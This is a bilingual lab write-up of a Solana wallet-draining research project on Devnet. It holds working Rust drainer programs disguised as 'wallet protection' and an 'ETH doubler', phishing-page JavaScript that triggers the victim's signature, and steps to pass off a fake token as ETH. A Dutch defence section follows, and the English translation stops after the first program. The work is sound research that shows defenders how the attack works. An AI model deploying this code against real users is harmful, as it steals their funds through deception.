---
title: 'Hoe kwaadaardige smart contracts en phishing samen je Solana-wallet legen'
title_en: 'How malicious smart contracts and phishing drain your Solana wallet'
description: Een onderzoeksproject over contract-based wallet draining, van de eerste regel Rust tot een werkende phishing-pagina. Hoe een onschuldig ogende knop onder de motorkap een SPL-token-transfer van slachtoffer naar aanvaller uitvoert, waarom Phantom de eerste versie betrapt, en hoe een nep-token de waarschuwing juist tegen de gebruiker gebruikt.
description_en: A research project on contract-based wallet draining, from the first line of Rust to a working phishing page. How an innocent-looking button runs an SPL token transfer from victim to attacker under the hood, why Phantom catches the first version, and how a fake token turns the warning against the user.
date: 2026-10-17
category:
  - Web3 Security
tags:
  - web3
  - solana
  - smart-contract
  - phishing
  - spl-token
  - phantom
difficulty: medium
readingTime: 22 min
pinned: false
draft: false
---

<div data-lang-block="nl">

> **⚠ Lab & autorisatie.** Dit is een gecontroleerd onderzoeksproject (Fontys HBO-ICT, PRP). Alles hieronder draait op de Solana **Devnet**, met **testwallets en testtokens die geen echte waarde hebben**. Er is geen echt slachtoffer en er zijn geen echte fondsen bij betrokken. Dezelfde technieken loslaten op echte gebruikers is diefstal en strafbaar. Ik schrijf dit bewust ook vanuit de verdediging: de blue-team-sectie onderaan hoort er net zo goed bij als de aanval.

> **◆ TL;DR.** Een memecoin-trader verbindt zijn Phantom-wallet met een dApp die iets onschuldigs belooft. Onder de motorkap voert een Solana-programma een **SPL-token-transfer van slachtoffer naar aanvaller** uit zodra het slachtoffer tekent. Versie 1, een kale transfer, wordt meteen door Phantom betrapt: de wallet simuleert de transactie en waarschuwt "je stuurt 1 token weg". In versie 2 verpak ik dezelfde diefstal als een **"ETH-verdubbelaar"**: ik neem 1 echte token én geef er 2 nep-tokens voor terug die zich voordoen als ETH. Nu toont Phantoms eigen simulatie "−1 ETH, +2 fakeETH", en dat lijkt pure winst. De waarschuwing wordt het lokaas.

Dit is de brug tussen twee werelden die ik interessant vind: de blockchain-belofte van "trustless, transparante code" en de keiharde realiteit van social engineering. Een smart contract is openbaar en onveranderlijk, maar dat betekent niet dat het eerlijk is. Ik bouw deze aanval van de grond af op, leg elke term uit, en laat elke stap zien, van de eerste regel Rust tot de werkende phishing-pagina. Ik eindig bij de vraag die er echt toe doet: hoe bescherm je hier een gebruiker tegen?

De bijbehorende research-repo (analyse en verdediging, geen kant-en-klare aanvalstool) staat op GitHub: [OffSecSaid/SmartContract-WalletDrainer](https://github.com/OffSecSaid/SmartContract-WalletDrainer).

## 00 · Context: waarom traders zo snel hun wallet verbinden

In de memecoin-wereld draait alles om snelheid. Een nieuwe coin start goedkoop, en wie er vroeg bij is kan zijn inleg vermenigvuldigen. Dat betekent dat traders de hele dag hun **software-wallet** (zoals Phantom op Solana) verbinden met onbekende sites, launchpads en "tools". Due diligence is zeldzaam, want elke seconde twijfel kan winst kosten. Precies dat gedrag, snel klikken en snel tekenen, is de voedingsbodem voor contract-based draining.

Belangrijk om vooraf te snappen: bij deze aanval worden er **geen inloggegevens of seed phrases gestolen**. Het slachtoffer geeft vrijwillig toestemming door een transactie te tekenen. Dat maakt het zo lastig te detecteren: technisch gezien doet de gebruiker "gewoon wat hij zelf goedkeurt".

## 01 · Wat is een smart contract (en wat is Devnet)?

Een **smart contract** is een zelf-uitvoerend programma dat op de blockchain staat en draait zodra aan bepaalde voorwaarden is voldaan. Zie het als een on-chain automaat: je stopt er een actie in, het programma voert automatisch een reactie uit, zonder tussenpersoon. Die contracts bestaan juist om interacties tussen mensen of systemen te automatiseren **zonder een centrale partij**, server of tussenpersoon te hoeven vertrouwen. In Web3 zie je ze overal: het ruilen van tokens (Uniswap), het kopen en verkopen van NFT's (OpenSea), en het goedkeuren en overmaken van tokens.

Om het concreet te maken, hier een piepklein contract in Solidity (de taal van Ethereum). Het laat iedereen Ethereum storten, houdt het saldo bij, en laat alléén de eigenaar weer opnemen:

```solidity
pragma solidity ^0.8.0;

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;            // wie het contract uitrolt, is de eigenaar
    }

    function deposit() public payable {}           // iedereen mag storten

    function withdraw(uint _amount) public {
        require(msg.sender == owner, "Not the owner");  // alleen de eigenaar mag opnemen
        payable(msg.sender).transfer(_amount);
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

De eigenaar rolt dit uit en wordt daarmee `owner`. Iemand anders kan vervolgens de open functies aanroepen, bijvoorbeeld `deposit{value: 2 ether}()` om 2 ETH te storten. Dat gebeurt onder de motorkap via een software-wallet als MetaMask, met het contractadres als bestemming: de gebruiker "tekent" het contract door de pop-up in zijn wallet goed te keuren. De code is openbaar en onveranderlijk zodra hij is uitgerold. Dat klinkt geruststellend, maar **transparantie is niet hetzelfde als veiligheid**. Niemand leest de broncode voordat hij op "Confirm" drukt; hij vertrouwt op wat zijn **wallet** hem toont, en daar zit de speelruimte voor de aanvaller.

**Hoe wordt zo'n contract dan kwaadaardig?** Doordat een aanvaller het zo ontwerpt dat de gebruiker een transactie tekent die hem de controle afneemt. Twee klassieke trucs:

- **De verborgen `approve()`-val.** Een regel als `token.approve(attackerAddress, type(uint256).max)` betekent letterlijk "laat dit adres een ongelimiteerd aantal van mijn tokens uitgeven". In de wallet verschijnt dat vaak als een onschuldig "Approve", maar het is in feite een blanco cheque.
- **Functies die zich anders voordoen dan ze zijn.** Een functie die `claimRewards()` heet maar intern `token.transferFrom(msg.sender, attacker, 1000 * 1e18)` uitvoert, haalt tokens weg bij het slachtoffer in plaats van beloningen uit te keren.

Op Solana heet zo'n programma simpelweg een **program**, geschreven in Rust, en dat is waar ik dit onderzoek op bouw. Ik bouw en test alles op de **Devnet**: een aparte tak van Solana die identiek werkt aan de mainnet, maar waar alle tokens waardeloos testgeld zijn. Ideaal voor onderzoek: je kunt het volledige aanvalsproces reproduceren zonder ook maar iets van waarde te raken.

Voordat we de code in duiken, eerst de hele aanval in één overzicht:

![Flowchart van de contract-based wallet-draining-aanval](/media/writeups/sc-flowchart.png)

_De volledige aanval in één plaat: het slachtoffer bezoekt de phishing-pagina, verbindt Phantom, en klikt op de knop. De JavaScript bouwt een transactie naar het kwaadaardige contract, de Solana-runtime voert de transfer-functie uit, en het tokensaldo verschuift van slachtoffer naar aanvaller. Alles op Devnet._

## 02 · De naïeve versie: van contract tot werkende aanval

### Het contract

Mijn eerste program doet precies één ding: het verplaatst een SPL-token van de ene account naar de andere, zodra de ondertekenaar (het slachtoffer) tekent. SPL-tokens zijn de Solana-variant van de bekende ERC-20-tokens op Ethereum. De functienaam en de `msg!`-logregels schreeuwen "bescherming", maar de code doet een transfer wég van het slachtoffer. Dit is de volledige `src/lib.rs`:

```rust
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Starting wallet protection setup");

    let accounts_iter = &mut accounts.iter(); // de meegegeven accounts

    let signer = next_account_info(accounts_iter)?;      // het slachtoffer
    let source = next_account_info(accounts_iter)?;      // token-account van het slachtoffer
    let destination = next_account_info(accounts_iter)?; // token-account van de aanvaller
    let token_program = next_account_info(accounts_iter)?;

    if !signer.is_signer {                               // alleen uitvoeren als er getekend is
        return Err(ProgramError::MissingRequiredSignature);
    }

    msg!("Verifying wallet configuration");

    let amount: u64 = 1_000_000_000;                     // 1 token (9 decimalen)
    let mut ix_data = vec![3];                           // 3 = "Transfer" in het SPL Token-programma
    ix_data.extend_from_slice(&amount.to_le_bytes());

    // Bouw de account-lijst voor de transfer
    let accounts_metas = vec![
        solana_program::instruction::AccountMeta::new(*source.key, false),
        solana_program::instruction::AccountMeta::new(*destination.key, false),
        solana_program::instruction::AccountMeta::new_readonly(*signer.key, true),
    ];

    let ix = solana_program::instruction::Instruction {
        program_id: *token_program.key,
        accounts: accounts_metas,
        data: ix_data,
    };

    msg!("Initializing wallet protection system");

    // Voer de transfer uit
    invoke(
        &ix,
        &[source.clone(), destination.clone(), signer.clone(), token_program.clone()],
    )?;

    msg!("Wallet protection system activated");
    Ok(())
}
```

De kern zit in `invoke(...)`: mijn program roept het officiële SPL Token-programma aan met instructie `3` (Transfer) en verschuift zo 1 token van `source` (slachtoffer) naar `destination` (aanvaller). De voorwaarde `signer.is_signer` zorgt dat dit alleen gebeurt als het slachtoffer de transactie daadwerkelijk heeft getekend, precies wat op de phishing-pagina gebeurt als hij op de knop klikt.

### Toolchain en projectstructuur

Ik ontwikkel op Linux met de Anza Solana-toolchain. De installatie:

```bash
sh -c "$(curl -sSfL https://release.anza.xyz/stable/install)"   # Anza Solana CLI 2.1.19
sudo apt install cargo       # Cargo 1.85
sudo apt install rustup      # Rustup 1.27.1
rustup default stable        # Rustc 1.86
```

De projectopbouw is die van een gewone Rust-crate. `Cargo.toml` is het manifest van het pakket (vergelijkbaar met `package.json` in Node) en `src/lib.rs` bevat de contractcode:

```text
wallet-drainer/
├── Cargo.toml        # manifest: naam, versie, dependencies (solana-program, spl-token)
├── src/
│   └── lib.rs        # de contractcode hierboven
└── target/
    └── deploy/       # hier komt het gecompileerde .so-bestand
```

### Bouwen en uitrollen op Devnet

Het program wordt gecompileerd naar SBF-bytecode (de bytecode die de Solana-runtime draait), daarna wijs ik de CLI naar Devnet, maak ik een keypair aan en rol ik het uit:

```bash
# compileer het program naar target/deploy/wallet_drainer.so
cargo build-sbf --manifest-path Cargo.toml --sbf-out-dir target/deploy

# wijs de CLI naar Devnet en maak een keypair voor het program
solana config set --url devnet
solana-keygen new --outfile ~/devnet-keypair-v2.json

# uitrollen -> dit print de Program ID die de frontend straks aanroept
solana program deploy --keypair ~/devnet-keypair-v2.json target/deploy/wallet_drainer.so
```

De **Program ID** is het adres waarmee mijn JavaScript het contract aanspreekt. Met `solana program show` controleer ik of het netjes op Devnet staat:

![Terminal met het uitgerolde program op Devnet](/media/writeups/sc-program-deploy.png)

_Het uitgerolde program op Devnet: Program ID `Gy5yvR7n46tDe7UGByZpSwXtkADXbuY55LbMrJ27cRxg`, eigenaar het BPF Loader, en de bijbehorende authority. Vanaf hier kan de frontend het contract aanroepen._

### Het slachtoffer van een token voorzien

Om de diefstal te demonstreren heeft het "slachtoffer" eerst een token nodig om te stelen. Ik maak een nieuwe SPL-token aan, geef het slachtoffer er een token-account voor, mint er wat in, en draag de authority over:

```bash
spl-token create-token                                          # -> MINT-adres (noem het x)
spl-token create-account x --owner <victim-address> \
  --url devnet --fee-payer ~/devnet-keypair-v2.json             # -> token-account (noem het y)
spl-token mint x 1000 y --url devnet --fee-payer ~/devnet-keypair-v2.json
spl-token authorize x mint <victim-address> \
  --url devnet --fee-payer ~/devnet-keypair-v2.json
```

### De phishing-frontend

De frontend is een gewone webpagina met twee knoppen: "Connect Wallet" en "Activate Protection". De JavaScript laadt de Solana-libraries rechtstreeks van een CDN:

```javascript
import { Connection, PublicKey, Transaction, clusterApiUrl }
  from "https://esm.sh/@solana/web3.js@1.73.2";
import { getAssociatedTokenAddress, TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction }
  from "https://esm.sh/@solana/spl-token@0.3.5";
import { Buffer } from "https://esm.sh/buffer@6.0.3";

// De drie waarden die de aanval "van mij" maken
const ATTACKER_PUBKEY = "GKZP4xi557jENMEWoqTi9XWsUiVqU8e6J98vd75mndCs";
const TOKEN_MINT      = "3NCE9Y6JZxEY39UC5GrtxTwZY4dBFWg7HYqzkecBi5XR";
const PROGRAM_ID      = "Gy5yvR7n46tDe7UGByZpSwXtkADXbuY55LbMrJ27cRxg"; // na elke contract-wijziging bijwerken
```

Het verbinden met Phantom is standaard Web3: ik vraag de wallet om een connectie en onthoud de publieke sleutel van het slachtoffer. De échte diefstal zit in `activateProtection()`, die de transactie bouwt. Let op de vier accounts die exact overeenkomen met wat mijn Rust-contract in dezelfde volgorde uitleest:

```javascript
// Verbind met de Phantom-wallet van het slachtoffer
async function connectWallet() {
  if (!window.solana) { showStatus("Phantom wallet not detected"); return; }
  provider = window.solana;
  await provider.connect({ onlyIfTrusted: false });
  userPubkey = provider.publicKey;
  activateBtn.disabled = false;
}

// "Activate protection" = bouw en verstuur de drainende transactie
async function activateProtection() {
  const programId = new PublicKey(PROGRAM_ID);

  const tx = new Transaction().add({
    keys: [
      { pubkey: userPubkey,           isSigner: true,  isWritable: true  }, // slachtoffer tekent
      { pubkey: userTokenAccount,     isSigner: false, isWritable: true  }, // source
      { pubkey: attackerTokenAccount, isSigner: false, isWritable: true  }, // destination
      { pubkey: TOKEN_PROGRAM_ID,     isSigner: false, isWritable: false },
    ],
    programId: programId,
    data: Buffer.from([]) // geen instructiedata nodig
  });

  tx.feePayer = userPubkey;
  const { blockhash } = await connection.getLatestBlockhash("confirmed");
  tx.recentBlockhash = blockhash;

  // De wallet-pop-up verschijnt hier; als het slachtoffer tekent, gaat de transfer door
  const signedTx = await provider.signTransaction(tx);
  const txId = await connection.sendRawTransaction(signedTx.serialize());
  await connection.confirmTransaction(txId, "confirmed");
  console.log(`Transaction sent: ${txId}`);
}
```

Zo ziet dat er aan de kant van het slachtoffer uit. Een nette, geruststellende pagina die belooft zijn wallet te beveiligen:

![De "Solana Security Guardian"-lokpagina met Connect Wallet en Activate Protection](/media/writeups/sc-guardian-page.png)

_De lokpagina van de naïeve versie: "Solana Security Guardian, secure your wallet against attacks". Twee knoppen, een vertrouwenwekkende tekst, en een "for educational purposes only"-voettekst die bij mijn lab-opzet hoort. Het slachtoffer verbindt zijn wallet en klikt op "Activate Protection"._

## 03 · Waarom dit faalt: Phantom simuleert de transactie

Hier doet de verdediging precies wat hij moet doen. Phantom voert een **transaction simulation** uit: het draait de transactie in een sandbox vóór de gebruiker tekent, en toont wat er gaat gebeuren. Bij mijn kale transfer verscheen er zwart-op-wit "−1 Unknown", oftewel: je raakt 1 token kwijt.

![Phantom-pop-up die bij de naïeve versie "−1 Unknown" toont](/media/writeups/sc-naive-phantom.png)

_Phantom simuleert de transactie en meldt eerlijk "−1 Unknown" plus de melding "Only confirm if you trust this website". De gebruiker ziet dus vooraf dat er iets wegstroomt. Geen trucje overleeft dat._

Als het slachtoffer tóch tekent, gaat de transfer gewoon door en is hij on-chain terug te vinden. Op Solscan zie je de hele keten: het slachtoffer interacteerde met mijn program, dat 1 token doorzette naar de aanvaller.

![Solscan-detail van de transactie: transfer van slachtoffer naar aanvaller via het program](/media/writeups/sc-solscan-transfer.png)

_De transactie op Solscan: status "Success / Finalized". Onder "Interact with program `Gy5yvR...27cRxg`" staat netjes "Transfer from `DKcX5v...` to `GKZP4x...` for 1 `3NCE9Y...`". De diefstal is gelukt, maar alleen omdat het slachtoffer de duidelijke waarschuwing negeerde._

Dit is een belangrijk inzicht voor de verdediging: **simulatie werkt**. Een eerlijke weergave van "wat kost deze handtekening mij" is de sterkste bescherming die een wallet kan bieden. Mijn eerste versie is dus niet realistisch, en dat is goed nieuws. De vraag die logisch volgt, en die ik als onderzoeker moet stellen om de aanval te begrijpen: kun je een transfer zó verpakken dat Phantoms simulatie er onschuldig, of zelfs aantrekkelijk uitziet?

## 04 · De verbeterde truc: de "ETH-verdubbelaar"

De aanpak van versie 2 is om de simulatie niet te omzeilen, maar hem in mijn voordeel te laten lezen. Het program doet nu **twee transfers in één transactie**:

1. **Transfer 1:** 1 echte token van het slachtoffer naar de aanvaller (de daadwerkelijke diefstal).
2. **Transfer 2:** 2 "nep-tokens" van het program terug naar het slachtoffer, ondertekend door het program zelf via een PDA.

Dit is de volledige `src/lib.rs` van de verdubbelaar:

```rust
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program::invoke_signed,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Starting Ethereum doubling service");

    let accounts_iter = &mut accounts.iter();

    let signer_account = next_account_info(accounts_iter)?;
    let user_eth_account = next_account_info(accounts_iter)?;
    let attacker_eth_account = next_account_info(accounts_iter)?;
    let user_fake_eth_account = next_account_info(accounts_iter)?;
    let program_fake_eth_account = next_account_info(accounts_iter)?;
    let vault_authority_account = next_account_info(accounts_iter)?;
    let token_program_account = next_account_info(accounts_iter)?;

    if !signer_account.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    // --- TRANSFER 1: slachtoffer stuurt echte ETH naar de aanvaller ---
    msg!("Step 1: User sending real ETH to our account");
    let eth_amount: u64 = 1_000_000_000; // 1 ETH

    let transfer_real_eth_ix = spl_token::instruction::transfer(
        token_program_account.key,
        user_eth_account.key,
        attacker_eth_account.key,
        signer_account.key,
        &[signer_account.key],
        eth_amount,
    )?;
    invoke(
        &transfer_real_eth_ix,
        &[
            user_eth_account.clone(),
            attacker_eth_account.clone(),
            signer_account.clone(),
            token_program_account.clone(),
        ],
    )?;

    // --- TRANSFER 2: het program stuurt nep-ETH terug naar het slachtoffer ---
    msg!("Step 2: Sending fake ETH to user");

    // Leid de PDA af die de nep-ETH-kluis van het program bezit
    let seed = b"eth_vault";
    let (vault_authority, bump_seed) = Pubkey::find_program_address(&[seed], program_id);
    if vault_authority != *vault_authority_account.key {
        return Err(ProgramError::InvalidArgument);
    }

    let fake_eth_amount: u64 = 2_000_000_000; // 2 nep-ETH

    let transfer_fake_eth_ix = spl_token::instruction::transfer(
        token_program_account.key,
        program_fake_eth_account.key,
        user_fake_eth_account.key,
        &vault_authority,
        &[],
        fake_eth_amount,
    )?;

    let bump = [bump_seed];
    let signer_seeds = &[&seed[..], &bump[..]];

    // Het program tekent zelf, als de vault-authority (geen privésleutel nodig)
    invoke_signed(
        &transfer_fake_eth_ix,
        &[
            program_fake_eth_account.clone(),
            user_fake_eth_account.clone(),
            vault_authority_account.clone(),
            token_program_account.clone(),
        ],
        &[signer_seeds],
    )?;

    msg!("Ethereum doubling completed successfully!");
    Ok(())
}
```

Twee begrippen die hier het werk doen. Een **PDA (Program Derived Address)** is een account dat "van het program zelf" is: het program kan ervoor tekenen zonder privésleutel, via `invoke_signed` met de juiste seeds (`b"eth_vault"` plus een bump). Zo haalt mijn program de nep-tokens uit zijn eigen kluis en geeft ze aan het slachtoffer. Het **nep-token** maak ik aan als een gewone SPL-token die het echte Ethereum nabootst.

### Het nep-token geloofwaardig maken

Een token is standaard naamloos; in de wallet zie je dan alleen "Unknown Token". Om de truc te laten werken moet het nep-token zich voordoen als ECHTE ETH, met de naam "Ethereum", het symbool "ETH" en het bekende logo. Daarvoor koppel ik on-chain metadata aan de mint. Het logo en een `metadata.json` pin ik op IPFS (via Pinata), en met **metaboss** hang ik die metadata aan het token:

```bash
# mint de imitatie-token met 9 decimalen
ETH_MINT=$(spl-token create-token --decimals 9 | awk '/Address/ {print $2}')

# pin een logo op IPFS, bouw de metadata, en koppel die aan de mint
CID_LOGO=$(curl -s -X POST https://api.pinata.cloud/pinning/pinFileToIPFS \
  -H "Authorization: Bearer $PINATA_JWT" -F "file=@eth-logo.png" | jq -r .IpfsHash)
cat > metadata.json <<EOF
{ "name": "Ethereum", "symbol": "ETH",
  "description": "Ethereum token on Solana Devnet (demo)",
  "image": "ipfs://$CID_LOGO" }
EOF
# ... pin metadata.json op IPFS, zet de IPFS-URL in token-data.json, en dan:
metaboss create metadata --mint "$ETH_MINT" --metadata token-data.json \
  --keypair ~/devnet-keypair-v2.json --rpc https://api.devnet.solana.com
```

Vervolgens maak ik een token-account aan dat eigendom is van de **PDA** van mijn program, en vul die met de nep-ETH. Het PDA-adres bereken ik met een klein scriptje, dezelfde seed als in het contract:

```javascript
const { PublicKey } = require('@solana/web3.js');
const programId = new PublicKey('<JOUW PROGRAM ID>');
const seed = Buffer.from('eth_vault');
const [pda, bump] = PublicKey.findProgramAddressSync([seed], programId);
console.log('Vault authority PDA:', pda.toString());
```

```bash
# token-account dat eigendom is van de PDA, daarna de nep-ETH erheen sturen
spl-token create-account <MINT> --owner <PDA-ADRES> --fee-payer ~/devnet-keypair-v2.json
spl-token transfer <MINT> 1000 <PDA-TOKEN-ACCOUNT> --owner ~/attacker.json \
  --fund-recipient --allow-unfunded-recipient
```

Na het opnieuw bouwen en uitrollen van het contract, en het bijwerken van de adressen in de HTML, is de verdubbelaar klaar.

### De wrange clou

Nu komt het pijnlijke punt: Phantom simuleert ook déze transactie, en meldt eerlijk "−1 ETH" en "+2 fakeETH". De verdedigingsfunctie, de simulatie uit versie 1, laat het slachtoffer nu zelf een "winst" zien: twee terug voor één. De aanvaller hoeft niemand meer te overtuigen; de wallet lijkt het goede nieuws zelf te brengen.

![De Phantom-pop-up van de verdubbelaar: −1 ETH, +2 fakeETH](/media/writeups/sc-phantom-doubler.png)

_De Phantom-pop-up van de "verdubbelaar". De simulatie schat "−1 ETH" en "+2 fakeETH". Phantom waarschuwt netjes ("Balance changes are estimated" en "Only confirm if you trust this website"), maar die +2 ziet eruit als pure winst. Precies daar wint de misleiding: niet door de waarschuwing te omzeilen, maar door hem in je voordeel te laten lezen._

## 05 · Het slachtofferperspectief

Vanaf de andere kant is het ontnuchterend simpel. De gebruiker landt op een pagina die belooft zijn ETH te verdubbelen, verbindt zijn wallet, klikt op de knop, ziet een wallet-pop-up die zegt dat hij 2 ETH terugkrijgt, en bevestigt. Eén echte token weg, twee waardeloze tokens terug die er in zijn wallet uitzien als echte ETH. Precies het soort "te mooi om waar te zijn"-belofte dat in de memecoin-hype toch werkt, want daar is verdubbelen niet eens ongeloofwaardig.

![De EthDouble-lokpagina](/media/writeups/sc-doubler-page.png)

_De lokpagina: "EthDouble, Double Your ETH". Nep-statistieken (358 gebruikers, 1.432 ETH verdubbeld, gemiddelde terugkeertijd 2,4 seconden) wekken vertrouwen en urgentie. De voettekst "for educational purposes only" hoort bij mijn lab-opzet._

En het resultaat, op Devnet: het echte token verhuist naar de wallet van de aanvaller.

![De wallet van de aanvaller in Testnet Mode met het binnengekomen token](/media/writeups/sc-attacker-wallet-testnet.png)

_Het resultaat in de wallet van de aanvaller, met de duidelijke "Testnet Mode"-banner: het binnengekomen token verschijnt als "Unknown Token". Op de mainnet zou dit het echte tegoed van het slachtoffer zijn._

## 06 · Blue team: hoe verdedig je hiertegen?

- **Vertrouw op transactiesimulatie, maar lees hem goed.** Phantoms simulatie is je sterkste wapen. De "verdubbelaar" misbruikt juist het feit dat gebruikers de token-namen niet controleren. Zie je een token dat je niet zelf hebt gekocht binnenkomen? Rode vlag.
- **Verifieer tokens, niet alleen namen.** Een token dat zich "ETH" noemt is niet ETH. Wallets zouden bekende token-namen en -symbolen moeten verifiëren tegen een betrouwbare lijst (verified token list) en moeten waarschuwen bij imitaties. Als gebruiker: check het mint-adres, niet het plaatje.
- **Teken niets bij onbekende dApps.** De aanval werkt alleen omdat een willekeurige website een wallet-pop-up mag triggeren. Verbind je wallet alleen met diensten die je kent en vertrouwt, en wees extra kritisch als er haast of een beloning in het spel is.
- **Scheid je "trading"-wallet van je spaarwallet.** Houd alleen kleine bedragen in de wallet waarmee je experimenteert. Zo is een foute handtekening een les, geen ramp.
- **Voor wallet-ontwikkelaars:** behandel token-metadata als niet-vertrouwd. Toon duidelijk het verschil tussen een geverifieerd en een onbekend/geïmiteerd token, en maak de netto-impact van een transactie onmogelijk te verbergen achter een misleidende naam.

De kern: op de blockchain is code transparant, maar vertrouwen wordt gewonnen in de **UI van de wallet**. Daar beslist de gebruiker, en daar moet de verdediging dus het scherpst zijn.

**Referenties:** Solana Docs (programs, PDA's, `invoke_signed`). SPL Token Program (Transfer-instructie). Metaboss & Pinata (token-metadata op IPFS). Phantom (transaction simulation). MITRE ATT&CK: T1657 (Financial Theft), T1534 (Internal Spearphishing, analoog voor social engineering). Coinbase (uitleg smart contracts en `approve()`-misbruik).

</div>

<div data-lang-block="en">

> **⚠ Lab & authorization.** This is a controlled research project (Fontys HBO-ICT, PRP). Everything below runs on the Solana **Devnet**, with **test wallets and test tokens that have no real value**. There is no real victim and no real funds are involved. Using the same techniques against real users is theft and a crime. I deliberately write this with the defence included: the blue-team section at the end belongs here just as much as the attack.

> **◆ TL;DR.** A memecoin trader connects his Phantom wallet to a dApp that promises something harmless. Under the hood, a Solana program runs an **SPL token transfer from victim to attacker** the moment the victim signs. Version 1, a bare transfer, is caught instantly by Phantom: the wallet simulates the transaction and warns "you are sending 1 token away". In version 2 I wrap the same theft as an **"ETH doubler"**: I take 1 real token and hand back 2 fake tokens that pose as ETH. Now Phantom's own simulation shows "−1 ETH, +2 fakeETH", which looks like pure profit. The warning becomes the bait.

This is the bridge between two worlds I find fascinating: the blockchain promise of "trustless, transparent code" and the hard reality of social engineering. A smart contract is public and immutable, but that does not make it honest. I build this attack from the ground up, explain every term, and show every step, from the first line of Rust to the working phishing page. I end at the question that actually matters: how do you protect a user from this?

The accompanying research repo (analysis and defence, not a ready-to-run attack tool) is on GitHub: [OffSecSaid/SmartContract-WalletDrainer](https://github.com/OffSecSaid/SmartContract-WalletDrainer).

## 00 · Context: why traders connect their wallet so quickly

In the memecoin world everything is about speed. A new coin starts cheap, and whoever is early can multiply their stake. That means traders spend all day connecting their **software wallet** (like Phantom on Solana) to unknown sites, launchpads and "tools". Due diligence is rare, because every second of hesitation can cost profit. That exact behaviour, clicking fast and signing fast, is the breeding ground for contract-based draining.

Important to understand up front: this attack steals **no credentials and no seed phrase**. The victim willingly grants permission by signing a transaction. That is what makes it so hard to detect: technically, the user is "just approving something himself".

## 01 · What is a smart contract (and what is Devnet)?

A **smart contract** is a self-executing program stored on the blockchain that runs once certain conditions are met. Think of it as an on-chain vending machine: you put an action in, the program automatically performs a reaction, with no middleman. These contracts exist precisely to automate interactions between people or systems **without relying on a central party**, server or intermediary. In Web3 you see them everywhere: swapping tokens (Uniswap), buying and selling NFTs (OpenSea), and approving and transferring tokens.

To make it concrete, here is a tiny contract in Solidity (Ethereum's language). It lets anyone deposit Ethereum, keeps track of the balance, and lets only the owner withdraw:

```solidity
pragma solidity ^0.8.0;

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;            // whoever deploys the contract is the owner
    }

    function deposit() public payable {}           // anyone may deposit

    function withdraw(uint _amount) public {
        require(msg.sender == owner, "Not the owner");  // only the owner may withdraw
        payable(msg.sender).transfer(_amount);
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

The owner deploys this and becomes the `owner`. Someone else can then call the open functions, for example `deposit{value: 2 ether}()` to deposit 2 ETH. That happens under the hood through a software wallet like MetaMask, with the contract address as the destination: the user "signs" the contract by approving the pop-up in his wallet. The code is public and immutable once deployed. That sounds reassuring, but **transparency is not the same as safety**. Nobody reads the source before pressing "Confirm"; they trust what their **wallet** shows them, and that is where the attacker's room to manoeuvre lies.

**So how does such a contract become malicious?** When an attacker designs it so the user signs a transaction that gives away control. Two classic tricks:

- **The hidden `approve()` trap.** A line like `token.approve(attackerAddress, type(uint256).max)` literally means "let this address spend an unlimited amount of my tokens". In the wallet it often shows up as a harmless "Approve", but it is essentially a blank cheque.
- **Functions that pretend to be something else.** A function named `claimRewards()` that internally runs `token.transferFrom(msg.sender, attacker, 1000 * 1e18)` moves tokens away from the victim instead of paying out rewards.

On Solana such a program is simply called a **program**, written in Rust, and that is what I build this research on. I build and test everything on **Devnet**: a separate branch of Solana that works identically to mainnet, but where all tokens are worthless test money. Ideal for research: you can reproduce the entire attack without touching anything of value.

Before we dive into the code, here is the whole attack at a glance:

![Flowchart of the contract-based wallet-draining attack](/media/writeups/sc-flowchart.png)

_The whole attack in one picture: the victim visits the phishing page, connects Phantom, and clicks the button. The JavaScript builds a transaction to the malicious contract, the Solana runtime runs the transfer function, and the token balance shifts from victim to attacker. All on Devnet._

## 02 · The naive version: from contract to working attack

### The contract

My first program does exactly one thing: it moves an SPL token from one account to another the moment the signer (the victim) signs. SPL tokens are the Solana equivalent of the familiar ERC-20 tokens on Ethereum. The function name and the `msg!` log lines scream "protection", but the code performs a transfer away from the victim. This is the full `src/lib.rs`:

```rust
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Starting wallet protection setup");

    let accounts_iter = &mut accounts.iter(); // the supplied accounts

    let signer = next_account_info(accounts_iter)?;      // the victim
    let source = next_account_info(accounts_iter)?;      // victim's token account
    let destination = next_account_info(accounts_iter)?; // attacker's token account
    let token_program = next_account_info(accounts_iter)?;

    if !signer.is_signer {                               // only run if it was signed
        return Err(ProgramError::MissingRequiredSignature);
    }

    msg!("Verifying wallet configuration");

    let amount: u64 = 1_000_000_000;                     // 1 token (9 decimals)
    let mut ix_data = vec![3];                           // 3 = "Transfer" in the SPL Token program
    ix_data.extend_from_slice(&amount.to_le_bytes());

    // Build the account list for the transfer
    let accounts_metas = vec![
        solana_program::instruction::AccountMeta::new(*source.key, false),
        solana_program::instruction::AccountMeta::new(*destination.key, false),
        solana_program::instruction::AccountMeta::new_readonly(*signer.key, true),
    ];

    let ix = solana_program::instruction::Instruction {
        program_id: *token_program.key,
        accounts: accounts_metas,
        data: ix_data,
    };

    msg!("Initializing wallet protection system");

    // Execute the transfer
    invoke(
        &ix,
        &[source.clone(), destination.clone(), signer.clone(), token_program.clone()],
    )?;

    msg!("Wallet protection system activated");
    Ok(())
}
```

